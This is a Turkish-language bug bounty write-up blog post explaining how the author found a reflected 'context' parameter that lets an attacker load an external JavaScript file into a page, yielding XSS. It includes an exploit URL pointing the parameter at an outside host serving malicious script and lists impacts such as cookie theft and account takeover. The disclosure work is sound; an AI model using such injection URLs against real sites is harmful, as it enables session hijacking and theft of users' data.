---
title: 'TR \| Javascript File Inclusion via a Simple Link Injection'
date: 2019-07-12
permalink: /posts/javascript-file-inclusion-via-simple-link-injection-xss/
tags:
  - xss
  - cross site scripting
  - javascript
  - file inclusion
  - link injection
  - hack
  - bugbounty
  - account takeover
  - write-up
  - poc
excerpt: 'Javascript File Inclusion (XSS) via a Simple Link Injection'
---

Merhaba arkadaşlar, ben Samet ŞAHİN.

HackerOne ( <a href="https://hackerone.com/">https://hackerone.com/</a> ) üzerindeki bir gizli (private) programa **Recognize** yaparken HTTP servisini kullanan bir IP adresi buldum. Bulduğum IP adresine girince direkt olarak bir index sayfasına yönlendiriyordu. Bu index sayfasının kaynak kodlarını (CTRL-U) okurken GET yöntemiyle değer alan bir `<form>` etiketi gördüm ve içerdiği `<input>` etiketlerinden "context" parametresinden değer aldığını fark ettim.  

<img src="/images/LinkInjectionBlogPost.PNG">  

Sıradan bir XSS araştırmasında tüm girdilere (input) XSS saldırı kodları (payload) girmeyi elbette deneyebilirsiniz. Evet XSS böyle de bulunur AMA kaynak kodunu okumayıp, fonksiyonların nasıl çalıştığını ve ne işe yaradığını anlamadan **hacking** denediğiniz anda otomatize araçlardan pek de bir farkınız kalmayacaktır. Fonksiyonların nasıl çalıştığını ve ne işe yaradığını anlamak da Bug Bounty alanında iyi çalışmalar yapan kişilerden aldığım önerilerden biridir. 

Yani buradan bir #bugbountytip çıkarak olursak : "Sitenin ne işe yaradığını sorgula ve nasıl bozarım diye düşün."

Ufak bir trickten sonra açığımıza geri dönelim. Kaynak kodunu okumuş ve "context" isimli bir girdi etiketinin varlığını anlamıştık. Şimdi eğer daha önce çok eski sitelere **Recognize** veya **Hacking** uyguladıysanız sitenin gerçekten çalışıp çalışmadığını kontrol etmelisiniz. Hadi gelin kontrol edelim. Link'in sonunda `?context=sametsahin` yazıyorum ve kaynak koduna nerelere ve nasıl yansıdığını inceliyorum.
> URL : <a href="https://127.0.0.1/blablabla/index.html?context=sametsahin">https://127.0.0.1/blablabla/index.html?context=sametsahin</a>  

<img src="/images/LinkInjectionBlogPost2.PNG">  

Yukarıdaki URL adresini ziyaret ediyoruz ve CTRL-U kombinasyonuyla kaynak koduna giriyoruz. Ardından da CTRL-F ile "sametsahin" değerini aratıyoruz. Gördüğümüz kadarıyla "sametsahin" değeri tam 63 farklı yerde ve farklı şekillerde yansımış. Birazdan bu farklı yansıma şekillerinden bir tanesini kullanarak "Medium 5.4" değerinde bir Cross Site Scripting (XSS) açığı elde edeceğiz. 

Yukarıdaki resimde HTML ve JavaScript için hayati önem arz eden `<script>` etiketine "sametsahin" değerinin basıldığını ve sonuna da /javascript.js dosyasının otomatik olarak eklendiğini görüyoruz. Bu ne anlama geliyor ? Nasıl bozarım ?

> Bu, websitesinin "context" parametresinden aldığı değeri direkt olarak `<script>` etiketinin başına eklediğini ve değerin hemen sonuna da javascript.js dosyasını alarak çalıştığını anlıyoruz.  


> Eğer benden aldığı değeri direkt olarak `<script>` etiketinin içine yerleştiriyor ise ben bu değeri bir kontrolümdeki site adresiyle değiştirip o sitedeki /javascript.js dosyasının içeriğini zararlı kodlar (payload) ile doldurarak XSS açığına erişebilirim.

Bu durumda XSS açığına sebep olan URL adresimiz şu şekilde gözükecektir.
> URL : <a href="https://127.0.0.1/blablabla/index.html?context=https://sametsahin.net/zararlikod.js?">https://127.0.0.1/blablabla/index.html?context=https://sametsahin.net/zararlikod.js?</a>  

<img src="/images/LinkInjectionBlogPost3.png">  


Ve URL adresine kullanıcıya tıklattırdığımda kullanıcı tarayıcısında zararlı kodumuz (XSS Payloadımız) çalışacaktır.  

<img src="/images/LinkInjectionBlogPost4.png">  



**Peki neler yaptık ?**  
1 -> Recognize ile bir HTTP uygulaması ve bir klasöre eriştik.  
2 -> Eriştiğimiz klasördeki index dosyasının kaynak kodunu okuduk.  
3 -> Kaynak kodunu okurken "context" isimli bir parametre olduğunug gördük.  
4 -> "Context" parametresinin nerelere ve nasıl yansıdığını tespit ettik.  
5 -> Kendimize bazı sorular sorduk.  
6 -> Kontrolümüzdeki bir websitesiyle değiştirdik ve "context" parametresine yazdık.  
7 -> Basit bir Link Injection'dan yola çıkarak en iyisinden bir Cross Site Scripting açığı elde ettik.  


**Peki bu Cross Site Scripting ile neler yapılabilirdi ?**  
1 -> Kullanıcı Cookie'leri çalınıp kullanıcı hesabına erişilebilirdik.  
2 -> Kullanıcıyı zararlı websitelerine yönlendirebilirdik.  
3- > CSRF Korumalarını bypass edebilir veya CSRF Tokenlerini çalabilirdik.  
4 -> Websitesinde sahte formlar oluşturup Email, Telefon, Adres, Kimlik ve Parola gibi hassas verileri çalabilirdik.  
....  


**HackerOne Raporu ?**  
<img src="/images/LinkInjectionBlogPost5.png">  



Normal bir XSS açığında saldırı senaryosu geniştir ama bu tür JavaScript dosyası dahil edilebilen tür XSS açıklarında zararlı kodunuzu dilediğiniz kadar uzun yazabildiğiniz için oldukça tehlikelidir. 

Ve tüm bu işlemlerin ardından ortaya çıkardığım orijinal bir #BugBountyTip : 
> **Even a Simple Link Injection can be very harmful. Depends on where it is.**

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Here is a blog and trick about : &quot;Javascript File Inclusion via a Simple Link Injection&quot;<a href="https://twitter.com/hashtag/bugbountytip?src=hash&amp;ref_src=twsrc%5Etfw">#bugbountytip</a> : Even a Simple Link Injection can be very harmful. Depends on where it is.<a href="https://t.co/TcOpslYuvE">https://t.co/TcOpslYuvE</a> <a href="https://t.co/ks5NJDD3ss">pic.twitter.com/ks5NJDD3ss</a></p>&mdash; Samet ŞAHİN (@sametsahinnet) <a href="https://twitter.com/sametsahinnet/status/1203377220871430144?ref_src=twsrc%5Etfw">December 7, 2019</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

Samet ŞAHİN
